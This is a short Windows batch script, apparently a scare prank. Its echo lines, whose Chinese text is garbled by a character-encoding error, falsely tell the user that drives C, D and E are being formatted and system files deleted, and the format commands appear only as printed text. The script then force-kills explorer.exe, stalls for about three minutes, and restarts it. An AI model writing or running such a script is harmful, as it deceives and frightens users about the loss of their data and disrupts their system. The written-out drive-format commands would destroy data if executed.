@echo off
Color 4A
Title ϵͳ����
echo ����׼�������Ե�......
echo ����ж��C�����г���......
echo ����ж��E�����г���......
echo ����ж��D�����г���......
echo ���ڸ�ʽ��C��......���Եȣ� format c:\
echo ���ڸ�ʽ��E��......���Եȣ� format e:\
echo ���ڸ�ʽ��D��......���Եȣ� format d:\
echo ����ɾ��ϵͳ��Ҫ�ļ�
echo ���ڳ���ɾ����Ҫ�ļ�
taskkill /f /im explorer.exe
echo 3���Ӻ���Խ���ʽ����ɣ��ڴ��ڼ�����رռ������������
ping 127.0.0.1 -n 180 >nul
start c:\windows\explorer.exe
pause